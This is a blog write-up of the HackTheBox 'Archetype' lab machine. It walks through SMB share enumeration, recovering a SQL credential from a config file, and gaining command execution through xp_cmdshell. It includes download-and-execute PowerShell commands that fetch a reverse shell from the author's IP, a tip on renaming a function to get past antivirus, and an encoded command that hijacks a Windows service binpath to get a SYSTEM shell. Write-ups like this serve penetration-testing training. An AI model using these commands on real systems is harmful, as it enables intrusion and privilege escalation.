---
weight: 1
title: "HacktheBox - Archetype Writeup"
date: 2021-07-20
draft: false
author: "SH∆FIQ ∆IM∆N"
authorLink: "https://shafiqaiman.com"
description: "HacktheBox - Archetype Writeup"
images: []
resources:
- name: "featured-image"
  src: "featured.png"

tags: ["reverse-powershell", "legacy", "smb", "smbclient", "crackmapexec-smb", "impacket-mssqlclient", "mssql", "xp_cmdshell", "nishang", "modify-services", "windows-check-OS-architecture"]
categories: ["HacktheBox","Windows"]

lightgallery: true
toc:
  auto: false
---

Box author | {{< person url="https://app.hackthebox.com/users/1190" name="egre55" picture="https://www.hackthebox.com/storage/avatars/a9527867b56b74bd7de6f0b940a04916.png" >}}

<!--more-->

## Enumeration

- 1000 ports scan
```bash
nmap -sC -sV -oN nmap/initial 10.10.10.27
```

![initial nmap scan](1.png "initial nmap scan")

- all ports scan

![full nmap scan](2.png "full nmap scan")

### Open ports
- 135 (msrpc)
- 139 (smb 4 sure)
- 445 (smb 4 sure)
- 1433 (ms-sql-s/Microsoft SQL Server)

## SMB Enum

### CrackMapEXEC

![crackmapexec](3.png "crackmapexec")

### smbclient

![smbclient](4.png "smbclient")

wow `backups` shares. Let's try connect to it.

![backup shares](5.png "backup shares")

- download the file using the `get command`

### prod.dtsConfig
- content of the file

```perl
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
we've got the credentials

- `ARCHETYPE\sql_svc:M3g4c0rp123`

## Foothold/Gaining Access

### mssqlclient.py[Impacket]

- mssqlclient syntax

```bash
mssqlclient.py <UserID>@<IP addr> -windows-auth
```

![mssqlclient](6.png "mssqlclient")

- always do this after login `enable_xp_cmdshell`
- let's try run `whoami`

![xp_cmdshell whoami](7.png "xp_cmdshell whoami")

- Note: I'm using `xp_cmdshell` then `whoami`

### Nishang

{{< admonition tip "Nishang" >}}
[Nishang](https://github.com/samratashok/nishang) is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.
{{< /admonition >}}

- I'm gonna copy the `Invoke-PowerShellTcp.ps1` into my `www` directory. Then, rename it to `rev.ps1`

![copy PowerShellTcp.ps1](8.png "copy PowerShellTcp.ps1")

- Open the `rev.ps1` file and pick one of the example. Then `copy` and `paste` it on the last line of the code.

{{< admonition tip >}}
Make sure! change the ip and port
{{< /admonition >}}


![PowerShellTcp.ps1 example](9.png "PowerShellTcp.ps1 example") _examples_

![modify PowerShellTcp.ps1](10.png "modify PowerShellTcp.ps1") <br>_put in here and save it_

- Time to upload the script into the machine by using `mssqlclient.py` that we connected.
	-	I'm gonna run `python server` inside `www` directory.
	-	`python3 -m http.server`
	- Then try to uploaded using this command:
		- `xp_cmdshell powershell IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.16.13:8000/rev.ps1\")`  
	- And this happen

![blocked by AV](11.png "blocked by AV") <br>  _it says this script got blocked by antivirus because of this function_

- So, I change the function into something else. It works.


![execute again](12.png "execute again")

## User flag

![user flag](14.png "user flag")

### WinPEAS

- Upload the winpeas binary into the machine
- I'm gonna use `powershell` to know this machine `architecture`
  - by using this command:
    - `(wmic os get OSArchitecture)[2]`

![check OSArchitecture](13.png "check OSArchitecture")

- This machine is 64-bit. I'm gonna upload `WinPEAS 64-bit version` to work.

- I'm gonna `copy` and `paste` the `WinPEAS` binary into my `www` folder.
- Let's upload it by using this command:
    - `IWR http://10.10.16.13:8000/winPEASx64.exe -OutFile winpeas.exe`

![download WinPEAS](15.png "download WinPEAS")

- Then run it by using this command `.\winpeas.exe`

## Privilege Escalation

### UsoSvc

- `WinPEAS` just found this juicy stuff:

![UsoSVC modify services](16.png "UsoSVC modify services")

### Modify service binary path
- According this [link](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services)
> If the group "Authenticated users" has *<font color="red">SERVICE\_ALL\_ACCESS</font>* in a service, then it can <font color="yellow">modify the binary</font> that is being executed by the service.

---

### Encoded Command
-  Here is the script before Encoded
```powershell
IEX(IWR http://10.10.16.13:8000/zzz.ps1 -UseBasicParsing)
```
- Time to encoded
```bash
echo "IEX(IWR http://10.10.16.13:8000/zzz.ps1 -UseBasicParsing)" | iconv -t utf-16le | base64 -w 0
```
- First, It's gonna encoded into `utf-16le`
- Second, It's gonna encoded into `base64`
- Sources [IppSec](https://youtu.be/iyYqgseKUPM?t=2299)

---

- So, I'm gonna `copy` another `powershell reverse shell` by name it into `zzz.ps1`
- Then upload it using this command:
```powershell
sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMQAzADoAOAAwADAAMAAvAHoAegB6AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="
```

- After that, run this command `sc.exe start UsoSvc`

![create a service](17.png "create a service")


![catch the shell](18.png "catch the shell") <br> _we've got the reverse shell and become system!_

## Administrator Flag

![administrator flag](19.png "administrator flag")

## Conclusion
I’ve learned a lot of tools today and `how to do a PowerShell reverse shell`. Ngl, this is a really fun box. I feel like my brain want to explode

I have a fun time doing this machine and I hope you guys too. Bye ;)